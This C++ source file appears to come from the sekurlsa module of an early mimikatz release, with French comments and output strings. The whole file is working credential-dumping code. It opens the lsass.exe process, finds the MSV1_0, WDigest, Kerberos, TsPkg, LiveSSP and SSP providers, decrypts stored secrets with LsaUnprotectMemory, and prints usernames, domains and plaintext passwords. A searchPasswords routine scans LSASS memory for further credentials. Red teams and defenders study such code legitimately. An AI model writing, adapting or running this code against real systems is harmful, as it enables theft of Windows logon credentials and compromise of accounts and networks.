/*	Benjamin DELPY `gentilkiwi`
http://blog.gentilkiwi.com
benjamin@gentilkiwi.com
Licence    : http://creativecommons.org/licenses/by/3.0/fr/
Ce fichier : http://creativecommons.org/licenses/by/3.0/fr/
*/
#include "mod_mimikatz_sekurlsa.h"
#include "..\global.h"
HMODULE mod_mimikatz_sekurlsa::hLsaSrv = NULL;
HANDLE mod_mimikatz_sekurlsa::hLSASS = NULL;
mod_process::KIWI_VERY_BASIC_MODULEENTRY mod_mimikatz_sekurlsa::localLSASRV, *mod_mimikatz_sekurlsa::pModLSASRV = NULL;
PLSA_SECPKG_FUNCTION_TABLE mod_mimikatz_sekurlsa::SeckPkgFunctionTable = NULL;

bool mod_mimikatz_sekurlsa::lsassOK = false;
vector<pair<mod_mimikatz_sekurlsa::PFN_ENUM_BY_LUID, wstring>> mod_mimikatz_sekurlsa::GLOB_ALL_Providers;
vector<mod_mimikatz_sekurlsa::KIWI_MODULE_PKG_LSA> mod_mimikatz_sekurlsa::mesModules;

vector<KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND> mod_mimikatz_sekurlsa::getMimiKatzCommands()
{
	vector<KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND> monVector;
	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(mod_mimikatz_sekurlsa_msv1_0::getMSV,		L"msv",		L"énumère les sessions courantes du provider MSV1_0"));
	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(mod_mimikatz_sekurlsa_wdigest::getWDigest,	L"wdigest",	L"énumère les sessions courantes du provider WDigest"));
	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(mod_mimikatz_sekurlsa_kerberos::getKerberos,	L"kerberos",L"énumère les sessions courantes du provider Kerberos"));
	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(mod_mimikatz_sekurlsa_tspkg::getTsPkg,		L"tspkg",	L"énumère les sessions courantes du provider TsPkg"));
	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(mod_mimikatz_sekurlsa_livessp::getLiveSSP,	L"livessp",	L"énumère les sessions courantes du provider LiveSSP"));
	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(mod_mimikatz_sekurlsa_ssp::getSSP,	L"ssp",	L"énumère les sessions courantes du provider SSP (msv1_0)"));
	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(getLogonPasswords,	L"logonPasswords",	L"énumère les sessions courantes des providers disponibles"));

	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(searchPasswords,	L"searchPasswords",	L"rechere directement dans les segments mémoire de LSASS des mots de passes"));
	return monVector;
}

bool mod_mimikatz_sekurlsa::getLogonPasswords(vector<wstring> * arguments)
{
	if(searchLSASSDatas())
		getLogonData(arguments, &GLOB_ALL_Providers);
	else
		(*outputStream) << L"Données LSASS en erreur" << endl;
	return true;
}

bool mod_mimikatz_sekurlsa::loadLsaSrv()
{
	if(!hLsaSrv)
		hLsaSrv = LoadLibrary(L"lsasrv");

	if(mesModules.empty())
	{
		mesModules.push_back(KIWI_MODULE_PKG_LSA(L"lsasrv.dll",		L"msv1_0",		mod_mimikatz_sekurlsa_msv1_0::getMSVLogonData,			&pModLSASRV));
		mesModules.push_back(KIWI_MODULE_PKG_LSA(L"tspkg.dll",		L"tspkg",		mod_mimikatz_sekurlsa_tspkg::getTsPkgLogonData,			&mod_mimikatz_sekurlsa_tspkg::pModTSPKG));
		mesModules.push_back(KIWI_MODULE_PKG_LSA(L"wdigest.dll",	L"wdigest",		mod_mimikatz_sekurlsa_wdigest::getWDigestLogonData,		&mod_mimikatz_sekurlsa_wdigest::pModWDIGEST));
		mesModules.push_back(KIWI_MODULE_PKG_LSA(L"kerberos.dll",	L"kerberos",	mod_mimikatz_sekurlsa_kerberos::getKerberosLogonData,	&mod_mimikatz_sekurlsa_kerberos::pModKERBEROS));
		mesModules.push_back(KIWI_MODULE_PKG_LSA(L"msv1_0.dll",		L"ssp",			mod_mimikatz_sekurlsa_ssp::getSSPLogonData,				&mod_mimikatz_sekurlsa_ssp::pModMSV));
		if(mod_system::GLOB_Version.dwBuildNumber >= 8000)
			mesModules.push_back(KIWI_MODULE_PKG_LSA(L"livessp.dll",L"livessp",		mod_mimikatz_sekurlsa_livessp::getLiveSSPLogonData,		&mod_mimikatz_sekurlsa_livessp::pModLIVESSP));
	}
	return (hLsaSrv != NULL);
}

bool mod_mimikatz_sekurlsa::unloadLsaSrv()
{
	for(vector<KIWI_MODULE_PKG_LSA>::iterator testModule = mesModules.begin(); testModule != mesModules.end(); testModule++)
		if(*testModule->pModuleEntry)
			delete *testModule->pModuleEntry;
	
	if(mod_system::GLOB_Version.dwMajorVersion < 6)
		mod_mimikatz_sekurlsa_keys_nt5::uninitLSASSData();
	else
		mod_mimikatz_sekurlsa_keys_nt6::uninitLSASSData();

	if(hLSASS)
		CloseHandle(hLSASS);
	if(hLsaSrv)
		FreeLibrary(hLsaSrv);

	return true;
}

bool mod_mimikatz_sekurlsa::searchLSASSDatas()
{
	if(!lsassOK)
	{
		if(!hLSASS)
		{
			mod_process::KIWI_PROCESSENTRY32 monProcess;
			wstring processName = L"lsass.exe";
			if(mod_process::getUniqueForName(&monProcess, &processName))
			{
				if(hLSASS = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, false, monProcess.th32ProcessID))
				{
					vector<mod_process::KIWI_VERY_BASIC_MODULEENTRY> monVecteurModules;
					if(mod_process::getVeryBasicModulesListForProcess(&monVecteurModules, hLSASS))
					{
						for(vector<mod_process::KIWI_VERY_BASIC_MODULEENTRY>::iterator leModule = monVecteurModules.begin(); leModule != monVecteurModules.end(); leModule++)
						{
							for(vector<KIWI_MODULE_PKG_LSA>::iterator testModule = mesModules.begin(); testModule != mesModules.end(); testModule++)
							{
								if((_wcsicmp(leModule->szModule.c_str(), testModule->moduleName) == 0) && !(*testModule->pModuleEntry))
								{
									GLOB_ALL_Providers.push_back(make_pair<PFN_ENUM_BY_LUID, wstring>(testModule->enumFunc, testModule->simpleName/*wstring(L"msv1_0")*/));
									*testModule->pModuleEntry = new mod_process::KIWI_VERY_BASIC_MODULEENTRY(*leModule);
									break;
								}
							}
						}
					} else {
						(*outputStream) << L"mod_process::getVeryBasicModulesListForProcess : " << mod_system::getWinError() << endl;
						CloseHandle(hLSASS);
						hLSASS = NULL;
					}
				} else (*outputStream) << L"OpenProcess : " << mod_system::getWinError() << endl;
			} else (*outputStream) << L"mod_process::getUniqueForName : " << mod_system::getWinError() << endl;
		}

		if(hLSASS)
		{
			MODULEINFO mesInfos;
			if(GetModuleInformation(GetCurrentProcess(), hLsaSrv, &mesInfos, sizeof(MODULEINFO)))
			{
				localLSASRV.modBaseAddr = reinterpret_cast<PBYTE>(mesInfos.lpBaseOfDll);
				localLSASRV.modBaseSize = mesInfos.SizeOfImage;

				if(!SeckPkgFunctionTable)
				{
					struct {PVOID LsaIRegisterNotification; PVOID LsaICancelNotification;} extractPkgFunctionTable = {GetProcAddress(hLsaSrv, "LsaIRegisterNotification"), GetProcAddress(hLsaSrv, "LsaICancelNotification")};
					if(extractPkgFunctionTable.LsaIRegisterNotification && extractPkgFunctionTable.LsaICancelNotification)
						mod_memory::genericPatternSearch(reinterpret_cast<PBYTE *>(&SeckPkgFunctionTable), L"lsasrv", reinterpret_cast<PBYTE>(&extractPkgFunctionTable), sizeof(extractPkgFunctionTable), - FIELD_OFFSET(LSA_SECPKG_FUNCTION_TABLE, RegisterNotification), NULL, true, true);
				}

				lsassOK = (mod_system::GLOB_Version.dwMajorVersion < 6) ? mod_mimikatz_sekurlsa_keys_nt5::searchAndInitLSASSData() : mod_mimikatz_sekurlsa_keys_nt6::searchAndInitLSASSData();
			}
		}
	}
	return lsassOK;
}

PLIST_ENTRY mod_mimikatz_sekurlsa::getPtrFromLinkedListByLuid(PLIST_ENTRY pSecurityStruct, unsigned long LUIDoffset, PLUID luidToFind)
{
	PLIST_ENTRY resultat = NULL;
	BYTE * monBuffer = new BYTE[LUIDoffset + sizeof(LUID)];
	PLIST_ENTRY pStruct = NULL;
	if(mod_memory::readMemory(pSecurityStruct, &pStruct, sizeof(pStruct), hLSASS))
	{
		while(pStruct != pSecurityStruct)
		{
			if(mod_memory::readMemory(pStruct, monBuffer, LUIDoffset + sizeof(LUID), hLSASS))
			{
				if(RtlEqualLuid(luidToFind, reinterpret_cast<PLUID>(reinterpret_cast<PBYTE>(monBuffer) + LUIDoffset)))
				{
					resultat = pStruct;
					break;
				}
			} else break;
			pStruct = reinterpret_cast<PLIST_ENTRY>(monBuffer)->Flink;
		}
	}
	delete [] monBuffer;
	return resultat;
}

PVOID mod_mimikatz_sekurlsa::getPtrFromAVLByLuid(PRTL_AVL_TABLE pTable, unsigned long LUIDoffset, PLUID luidToFind)
{
	PVOID resultat = NULL;
	RTL_AVL_TABLE maTable;
	if(mod_memory::readMemory(pTable, &maTable, sizeof(RTL_AVL_TABLE), hLSASS))
		resultat = getPtrFromAVLByLuidRec(reinterpret_cast<PRTL_AVL_TABLE>(maTable.BalancedRoot.RightChild), LUIDoffset, luidToFind);
	return resultat;
}

PVOID mod_mimikatz_sekurlsa::getPtrFromAVLByLuidRec(PRTL_AVL_TABLE pTable, unsigned long LUIDoffset, PLUID luidToFind)
{
	PVOID resultat = NULL;
	RTL_AVL_TABLE maTable;
	if(mod_memory::readMemory(pTable, &maTable, sizeof(RTL_AVL_TABLE), hLSASS))
	{
		if(maTable.OrderedPointer)
		{
			BYTE * monBuffer = new BYTE[LUIDoffset + sizeof(LUID)];
			if(mod_memory::readMemory(maTable.OrderedPointer, monBuffer, LUIDoffset + sizeof(LUID), hLSASS))
			{
				if(RtlEqualLuid(luidToFind, reinterpret_cast<PLUID>(reinterpret_cast<PBYTE>(monBuffer) + LUIDoffset)))
					resultat = maTable.OrderedPointer;
			}
			delete [] monBuffer;
		}

		if(!resultat && maTable.BalancedRoot.LeftChild)
			resultat = getPtrFromAVLByLuidRec(reinterpret_cast<PRTL_AVL_TABLE>(maTable.BalancedRoot.LeftChild), LUIDoffset, luidToFind);
		if(!resultat && maTable.BalancedRoot.RightChild)
			resultat = getPtrFromAVLByLuidRec(reinterpret_cast<PRTL_AVL_TABLE>(maTable.BalancedRoot.RightChild), LUIDoffset, luidToFind);
	}
	return resultat;
}

void mod_mimikatz_sekurlsa::genericCredsToStream(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCreds, bool justSecurity, bool isDomainFirst, PDWORD pos)
{
	if(mesCreds)
	{
		if(mesCreds->Password.Buffer || mesCreds->UserName.Buffer || mesCreds->Domaine.Buffer)
		{
			wstring userName	= mod_process::getUnicodeStringOfProcess(&mesCreds->UserName, hLSASS);
			wstring domainName	= mod_process::getUnicodeStringOfProcess(&mesCreds->Domaine, hLSASS);
			wstring password	= mod_process::getUnicodeStringOfProcess(&mesCreds->Password, hLSASS, SeckPkgFunctionTable->LsaUnprotectMemory);
			wstring rUserName	= (isDomainFirst ? domainName : userName);
			wstring rDomainName	= (isDomainFirst ? userName : domainName);

			if(justSecurity)
			{
				if(!pos)
					(*outputStream) << password;
				else
					(*outputStream) << endl <<
					L"\t [" << *pos << L"] { " << rUserName << L" ; " << rDomainName << L" ; " << password << L" }";
			}
			else
			{
				if(!pos)
					(*outputStream) << endl <<
					L"\t * Utilisateur  : " << rUserName << endl <<
					L"\t * Domaine      : " << rDomainName << endl <<
					L"\t * Mot de passe : " << password;
				else
					(*outputStream) << endl <<
					L"\t * [" << *pos  << L"] Utilisateur  : " << rUserName << endl <<
					L"\t       Domaine      : " << rDomainName << endl <<
					L"\t       Mot de passe : " << password;
			}
		}
	} else (*outputStream) << L"n.t. (LUID KO)";
}

bool mod_mimikatz_sekurlsa::getLogonData(vector<wstring> * mesArguments, vector<pair<PFN_ENUM_BY_LUID, wstring>> * mesProviders)
{
	PLUID sessions;
	ULONG count;

	if (NT_SUCCESS(LsaEnumerateLogonSessions(&count, &sessions)))
	{
		for (ULONG i = 0; i < count ; i++)
		{
			PSECURITY_LOGON_SESSION_DATA sessionData = NULL;
			if(NT_SUCCESS(LsaGetLogonSessionData(&sessions[i], &sessionData)))
			{
				if(sessionData->LogonType != Network)
				{
					(*outputStream) << endl <<
						L"Authentification Id         : "	<< sessions[i].HighPart << L";" << sessions[i].LowPart << endl <<
						L"Package d\'authentification  : "	<< mod_text::stringOfSTRING(sessionData->AuthenticationPackage) << endl <<
						L"Utilisateur principal       : "	<< mod_text::stringOfSTRING(sessionData->UserName) << endl <<
						L"Domaine d\'authentification  : "	<< mod_text::stringOfSTRING(sessionData->LogonDomain) << endl;

					for(vector<pair<PFN_ENUM_BY_LUID, wstring>>::iterator monProvider = mesProviders->begin(); monProvider != mesProviders->end(); monProvider++)
					{
						(*outputStream) << L'\t' << monProvider->second << (mesArguments->empty() ? (L" :") : (L"")) << L'\t';
						monProvider->first(&sessions[i], mesArguments->empty());
						(*outputStream) << endl;
					}
				}
				LsaFreeReturnBuffer(sessionData);
			}
			else (*outputStream) << L"Erreur : Impossible d\'obtenir les données de session" << endl;
		}
		LsaFreeReturnBuffer(sessions);
	}
	else (*outputStream) << L"Erreur : Impossible d\'énumerer les sessions courantes" << endl;

	return true;
}

bool mod_mimikatz_sekurlsa::ressembleString(PUNICODE_STRING maChaine, wstring * dstChaine, BYTE **buffer)
{
	bool resultat = false;
	BYTE * monBuffer = NULL;
	PBYTE * leBuffer = buffer ? buffer : &monBuffer;
	if(mod_process::getUnicodeStringOfProcess(maChaine, leBuffer, hLSASS))
	{
		int flags = IS_TEXT_UNICODE_ODD_LENGTH | IS_TEXT_UNICODE_STATISTICS;
		if(resultat = (IsTextUnicode(*leBuffer, maChaine->Length, &flags) != 0))
		{
			if(dstChaine)
				dstChaine->assign(reinterpret_cast<const wchar_t *>(*leBuffer), maChaine->Length / sizeof(wchar_t));
		}
	}
	if(monBuffer)
		delete[] monBuffer;
	return resultat;
}

bool mod_mimikatz_sekurlsa::searchPasswords(vector<wstring> * arguments)
{
	if(searchLSASSDatas())
	{
		if(PNT_QUERY_SYSTEM_INFORMATION NtQuerySystemInformation = reinterpret_cast<PNT_QUERY_SYSTEM_INFORMATION>(GetProcAddress(GetModuleHandle(L"ntdll"), "NtQuerySystemInformation")))
		{
#ifdef _M_X64
			PBYTE MmSystemRangeStart = reinterpret_cast<PBYTE>(0xffff080000000000);
#elif defined _M_IX86
			PBYTE MmSystemRangeStart = reinterpret_cast<PBYTE>(0x80000000);
#endif
			ULONG maTaille = 0;
			NtQuerySystemInformation(KIWI_SystemMmSystemRangeStart, &MmSystemRangeStart, sizeof(PBYTE), &maTaille);

			DWORD nbPossible = 0;
			for(PBYTE pMemoire = 0; pMemoire < MmSystemRangeStart ; )
			{
				MEMORY_BASIC_INFORMATION mesInfos;
				if(VirtualQueryEx(hLSASS, pMemoire, &mesInfos, sizeof(MEMORY_BASIC_INFORMATION)) > 0)
				{
					if((mesInfos.Protect & PAGE_READWRITE) && !(mesInfos.Protect & PAGE_GUARD) && (mesInfos.Type == MEM_PRIVATE))
					{
						UNICODE_STRING donnees[3];
						for(PBYTE pZone = reinterpret_cast<PBYTE>(mesInfos.BaseAddress); pZone < (reinterpret_cast<PBYTE>(mesInfos.BaseAddress) + mesInfos.RegionSize - 3*sizeof(UNICODE_STRING)); pZone += sizeof(DWORD))
						{
							if(mod_memory::readMemory(pZone, donnees, 3*sizeof(UNICODE_STRING), hLSASS))
							{
								if(
									(donnees[0].Length && !((donnees[0].Length & 1) || (donnees[0].MaximumLength & 1)) && (donnees[0].Length < sizeof(wchar_t)*0xff) && (donnees[0].Length <= donnees[0].MaximumLength) && donnees[0].Buffer) &&
									(donnees[1].Length && !((donnees[1].Length & 1) || (donnees[1].MaximumLength & 1)) && (donnees[1].Length < sizeof(wchar_t)*0xff) && (donnees[1].Length <= donnees[1].MaximumLength) && donnees[1].Buffer) &&
									(donnees[2].Length && !((donnees[2].Length & 1) || (donnees[2].MaximumLength & 1)) && (donnees[2].Length < sizeof(wchar_t)*0xff) && (donnees[2].Length <= donnees[2].MaximumLength) && donnees[2].Buffer)
									)
								{
									wstring user, domain, password;
									BYTE * bPassword = NULL;
									if(ressembleString(&donnees[0], &user) && ressembleString(&donnees[1], &domain) && !ressembleString(&donnees[2], NULL, &bPassword))
									{
										if(bPassword)
										{
											mod_mimikatz_sekurlsa::SeckPkgFunctionTable->LsaUnprotectMemory(bPassword, donnees[2].MaximumLength);
											password.assign(mod_text::stringOrHex(bPassword, donnees[2].Length, 0, false));
										}
										(*outputStream) << L"[" << nbPossible++ << L"] { " << user << L" ; " << domain << L" ; " << password << L" }" << endl;
									}

									if(bPassword)
										delete[] bPassword;
								}
							}
						}
					}
					pMemoire += mesInfos.RegionSize;
				}
				else break;
			}
		}
	}
	else (*outputStream) << L"Données LSASS en erreur" << endl;
	return true;
}